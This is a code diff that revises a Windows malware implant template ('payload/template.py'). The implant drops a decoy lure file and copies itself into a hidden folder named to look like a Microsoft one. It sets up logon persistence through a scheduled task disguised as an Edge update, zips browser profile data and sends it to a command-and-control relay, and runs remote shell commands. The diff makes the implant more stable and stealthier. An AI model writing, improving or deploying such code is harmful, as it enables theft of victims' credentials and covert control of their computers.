@@ -1,16 +1,37 @@
-# payload/template.py (Full Code - Revamped for Stability)
-import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, zipfile
+# payload/template.py (Full Code - Final Stability Revamp)
+import sys
+import os
+import time
+import threading
+import platform
+import base64
+import subprocess
+import uuid
+import requests
+import json
+import socket
+import getpass
+import shutil
+import zipfile
 from datetime import datetime
 
 # Graceful Import Handling
-try: from mss import mss
-except ImportError: mss = None
-try: import winreg
-except ImportError: winreg = None
-try: import psutil
-except ImportError: psutil = None
-try: import ctypes
-except ImportError: ctypes = None
+try:
+    from mss import mss
+except ImportError:
+    mss = None
+try:
+    import winreg
+except ImportError:
+    winreg = None
+try:
+    import psutil
+except ImportError:
+    psutil = None
+try:
+    import ctypes
+except ImportError:
+    ctypes = None
 
 # --- INJECTED BY BUILDER ---
 RELAY_URL = {{RELAY_URL}}
@@ -27,6 +48,7 @@ DECOY_DATA_B64 = {{DECOY_DATA_B64}}
 SESSION_ID = str(uuid.uuid4())
 results_to_send, results_lock = [], threading.Lock()
 TERMINATE_FLAG = threading.Event()
+STEALTH_DIR = os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'SysData')
 
 # --- Utility Functions ---
 def send_result(command_name, output_data, status="success"):
@@ -39,7 +61,8 @@ def _run_command(command):
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, startupinfo=startupinfo, errors='ignore')
         return result.stdout.strip()
-    except: return ""
+    except:
+        return ""
 
 def _get_appdata_paths():
     base = os.path.expanduser("~")
@@ -58,9 +81,8 @@ def _action_shell(params):
 def _action_pslist(params):
     if not psutil: return {"status": "error", "data": "Psutil library not available."}
     procs = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
-    return {"status": "success", "data": sorted(procs, key=lambda p: p['name'])}
+    return {"status": "success", "data": sorted(procs, key=lambda p: p.get('name') or '')}
 
-# --- Data Harvesting ---
 def harvest_browser_files(appdata_paths):
     browser_paths = {
         'Chrome': os.path.join(appdata_paths["local"], 'Google\\Chrome\\User Data'),
@@ -84,7 +106,7 @@ def harvest_browser_files(appdata_paths):
         return {"status": "success", "data": b64_zip}
     except Exception as e: return {"status": "error", "data": f"Failed to package browser files: {e}"}
 
-def perform_initial_harvest():
+def perform_full_harvest():
     try:
         appdata = _get_appdata_paths()
         uname = platform.uname()
@@ -92,16 +114,12 @@ def perform_initial_harvest():
         time.sleep(0.1)
         browser_data = harvest_browser_files(appdata)
         send_result("Browser Files", browser_data)
-        time.sleep(0.1)
-        # Add any other lightweight startup info here
         send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] Initial harvest complete.")
     except Exception as e:
         send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] CRITICAL ERROR during harvest: {e}")
 
-# --- FIX: New action handler for server-commanded harvest ---
 def _action_full_harvest(params):
-    # Run the harvest in a new thread to avoid blocking the C2 loop
-    harvest_thread = threading.Thread(target=perform_initial_harvest, daemon=True)
+    harvest_thread = threading.Thread(target=perform_full_harvest, daemon=True)
     harvest_thread.start()
     return {"status": "success", "data": "Full harvest initiated."}
 
@@ -118,7 +136,6 @@ def execute_command(command_data):
             requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
         except requests.exceptions.RequestException: pass
 
-# --- Main C2 Loop (Now more stable) ---
 def command_and_control_loop():
     initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.system()}
     while not TERMINATE_FLAG.is_set():
@@ -140,37 +157,47 @@ def initial_lure():
         try:
             decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
             with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
-            subprocess.Popen(f'start "" "{decoy_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            subprocess.Popen(f'start "" "{decoy_path}"', shell=True, startupinfo=startupinfo)
         except: pass
 
-def install_persistence(stealth_path):
+def setup_persistence(stealth_path):
     if not (PERSISTENCE_ENABLED and platform.system() == "Windows"): return
     task_name = f"Microsoft Edge Update Task Core"
     command = f'schtasks /create /tn "{task_name}" /tr "\'{stealth_path}\'" /sc onlogon /rl highest /f'
     _run_command(command)
 
-if __name__ == "__main__":
-    stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'SysData')
-    my_name = os.path.basename(sys.executable)
-    stealth_path = os.path.join(stealth_dir, my_name)
-
-    # This logic ensures the payload only tries to install itself once.
-    if hasattr(sys, 'frozen') and os.path.abspath(sys.executable).lower() != stealth_path.lower():
-        try:
-            initial_lure()
-            os.makedirs(stealth_dir, exist_ok=True)
-            shutil.copy2(sys.executable, stealth_path)
-            install_persistence(stealth_path)
-            subprocess.Popen([stealth_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
-        except Exception:
-            pass # If setup fails, we'll just run from here temporarily.
-        finally:
-            sys.exit(0) # The original process always exits.
-
-    # --- Main execution for the persistent process ---
-    c2_thread = threading.Thread(target=command_and_control_loop, daemon=False)
+def main_logic():
+    """Contains the primary C2 loop and waits for termination."""
+    c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
     c2_thread.start()
+    TERMINATE_FLAG.wait()
+
+if __name__ == "__main__":
+    my_name = os.path.basename(sys.executable)
+    stealth_path = os.path.join(STEALTH_DIR, my_name)
+
+    # --- THE DEFINITIVE FIX: Sane Execution Flow ---
+    # This logic block handles the "installer" phase of the payload.
+    # It only runs if compiled and NOT in its final destination.
+    if hasattr(sys, 'frozen') and os.path.abspath(sys.executable).lower() != stealth_path.lower():
+        initial_lure()
+        try:
+            os.makedirs(STEALTH_DIR, exist_ok=True)
+            shutil.copy2(sys.executable, stealth_path)
+            setup_persistence(stealth_path)
+            
+            # Use CREATE_NO_WINDOW to ensure the new process is completely hidden
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            subprocess.Popen([stealth_path], creationflags=subprocess.DETACHED_PROCESS, startupinfo=startupinfo)
+        except Exception:
+            # If persistence fails, we don't want to crash. The C2 loop will start below.
+            pass
+        finally:
+            # The original executable ALWAYS exits after attempting to install.
+            sys.exit(0)
     
-    # Keep the main thread alive, allowing daemon threads to run
-    while not TERMINATE_FLAG.is_set():
-        time.sleep(60)
+    # This is the main execution block for the persistent payload (or if running as a .py)
+    main_logic()
